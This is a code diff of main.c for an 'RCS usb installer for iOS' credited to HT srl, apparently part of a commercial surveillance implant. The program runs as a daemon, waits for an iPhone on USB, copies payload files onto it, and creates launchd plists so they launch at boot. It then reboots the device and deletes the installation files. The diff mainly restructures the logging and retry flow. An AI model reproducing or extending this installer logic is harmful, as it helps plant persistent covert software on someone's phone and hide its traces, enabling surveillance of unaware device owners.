@@ -1,9 +1,9 @@
 //
 //  main.c
-//  RCSUSBInstaller
+//  RCS usb installer for iOS
 //
 //  Created by armored on 2/6/13.
-//  Copyright (c) 2013 armored. All rights reserved.
+//  Copyright (c) HT srl 2013 Massimo Chiodini. All rights reserved.
 //
 
 #include <stdio.h>
@@ -22,156 +22,130 @@ int main(int argc, const char * argv[])
 
   if (argv[1] != NULL && strcmp(argv[1], "--nodaemon") == 0)
   {
-    syslog(LOG_INFO, "iosusb - Running %s in foreground...\n", argv[0]);
+    syslog(LOG_INFO, "Running %s in foreground...\n", argv[0]);
   }
   else
   {
-    pid_t pid,sid;
+    pid_t pid;
 
-    syslog(LOG_INFO, "iosusb - Running daemon...\n");
+    syslog(LOG_INFO, "Running daemon...\n");
 
-    /* Fork off the parent process */       
     pid = fork();
+    
     if (pid < 0) {
        exit(EXIT_FAILURE);
     }
-    /* If we got a good PID, then
-       we can exit the parent process. */
+
     if (pid > 0) {
             exit(EXIT_SUCCESS);
     }
-    /* Change the file mode mask */
-    //umask(0);
-
-    //syslog(LOG_INFO, "iosusb - umask setted\n");
-
-    /* Create a new SID for the child process 
-    sid = setsid();
-
-    syslog(LOG_INFO, "iosusb - sid setted\n");
-    
-    if (sid < 0) {
-            exit(EXIT_FAILURE);
-    }
-    */
-
-    //syslog(LOG_INFO, "iosusb - chdir done\n");
-
-    /* Change the current working directory */
-    //if ((chdir("/")) < 0) {
-    // exit(EXIT_FAILURE);
-    //}
-   
-    /* Close out the standard file descriptors */
-    //close(STDIN_FILENO);
-    //close(STDOUT_FILENO);
-    //close(STDERR_FILENO);
   }
 
-  syslog(LOG_INFO, "iosusb - Waiting for device...\n");
+  syslog(LOG_INFO, "Waiting for device...\n");
 
-while(1)
-{
+  while(1)
+  {
 retry_installation:
 
-  while(devAttach == 0)
-  {
-    devAttach = isDeviceAttached();
+    while(devAttach == 0)
+    {
+      devAttach = isDeviceAttached();
+      sleep(1);
+    }
+
+    syslog(LOG_INFO, "Device attached!\n");
+
     sleep(1);
-  }
 
-  syslog(LOG_INFO, "iosusb - Device attached!\n");
+    if (check_installation(1, 2) == 1)
+    {
+      syslog(LOG_INFO, "Device already installed!\n");
+      
+      sleep (5);
 
-  sleep(1);
+      goto retry_installation;
+    } 
 
-  if (check_installation(1, 2) == 1)
-  {
-    syslog(LOG_INFO, "iosusb - Device already installed!\n");
-    
-    sleep (5);
+    syslog(LOG_INFO, "start installation...\n");
 
-    goto retry_installation;
-  } 
+    char **dir_content = list_dir_content("/ios-install");
 
-  syslog(LOG_INFO, "iosusb - start installation...\n");
+    if (dir_content[0] == NULL)
+    {
+      syslog(LOG_INFO, "cannot found installation dir!\n");
+      goto retry_installation;
+    }
 
-  char **dir_content = list_dir_content("/ios-install");
+    syslog(LOG_INFO, "create installation dir...\n");
 
-  if (dir_content[0] == NULL)
-  {
-    syslog(LOG_INFO, "iosusb - cannot found installation dir!\n");
-    return 0;
-  }
+    if (make_install_directory() != 0)
+    {
+      syslog(LOG_INFO, "cannot create installer folder\n");
+  	  goto retry_installation;
+    }
 
-  syslog(LOG_INFO, "iosusb - create installation dir...\n");
+    syslog(LOG_INFO, "copy files...");
 
-  if (make_install_directory() != 0)
-  {
-    syslog(LOG_INFO, "iosusb - cannot create installer folder\n");
-	  return 0;
-  }
+    if (copy_install_files("/ios-install", dir_content) != 0)
+    {
+      syslog(LOG_INFO, "\ncannot copy files in installer folder\n");
+  	  goto retry_installation;
+    }
 
-  syslog(LOG_INFO, "iosusb - copying files...\n");
+    syslog(LOG_INFO, " done!\n");
 
-  if (copy_install_files("/ios-install", dir_content) != 0)
-  {
-    syslog(LOG_INFO, "iosusb - cannot copy files in installer folder\n");
-	  return 0;
-  }
+    if (create_launchd_plist() != 0)
+    {
+     syslog(LOG_INFO, "cannot create plist files\n");
+     goto retry_installation;
+    }
 
-  syslog(LOG_INFO, "iosusb - copying files... done!\n");
+    syslog(LOG_INFO, "try to restart device...");
 
-  if (create_launchd_plist() != 0)
-  {
-   syslog(LOG_INFO, "iosusb - cannot create plist files\n");
-   return 0;
-  }
+    if (restart_device() == 1)
+    {
+      syslog(LOG_INFO, " restarting\n");
+    }
+    else 
+    {
+  	 syslog(LOG_INFO, "\ncan't restart device: try it manually!\n");
+    }
 
-  syslog(LOG_INFO, "iosusb - try to restart device...\n");
-
-  if (restart_device() == 1)
-  {
-    syslog(LOG_INFO, "iosusb - try to restart device...restarting\n");
-  }
-  else 
-  {
-	 syslog(LOG_INFO, "iosusb - can't restart device: try it manually!\n");
-  }
-
-  sleep(1);
-
-  int isDeviceOn = 0;
-
-  // Wait for device off
-  do
-  {
-    isDeviceOn = isDeviceAttached();
     sleep(1);
-  } while(isDeviceOn == 1);
 
-  // Wait for device on
-  do
-  {
-    isDeviceOn = isDeviceAttached();
-    sleep(1);
-  } while(isDeviceOn == 0);
+    int isDeviceOn = 0;
 
-  syslog(LOG_INFO, "iosusb - device connected\n");
+    // Wait for device off
+    do
+    {
+      isDeviceOn = isDeviceAttached();
+      sleep(1);
+    } while(isDeviceOn == 1);
 
-  syslog(LOG_INFO, "iosusb - checking installation...\n");
+    // Wait for device on
+    do
+    {
+      isDeviceOn = isDeviceAttached();
+      sleep(1);
+    } while(isDeviceOn == 0);
 
-  if (check_installation(10, 10) == 1)
-  {
-	 syslog(LOG_INFO, "iosusb - installation done!\n");
+    syslog(LOG_INFO, "device connected\n");
 
-	 if (remove_installation() == 0)
-		syslog(LOG_INFO, "iosusb - cannot remove installation file!\n");
+    syslog(LOG_INFO, "checking installation...\n");
+
+    if (check_installation(10, 10) == 1)
+    {
+  	 syslog(LOG_INFO, "installation done!\n");
+
+  	 if (remove_installation() == 0)
+  		syslog(LOG_INFO, "cannot remove installation file!\n");
+    }
+    else
+    {
+  	 syslog(LOG_INFO, "installation failed: please retry!\n");
+    }
   }
-  else
-  {
-	 syslog(LOG_INFO, "iosusb - installation failed: please retry!\n");
-  }
-}
+
   return 0;
 }
 
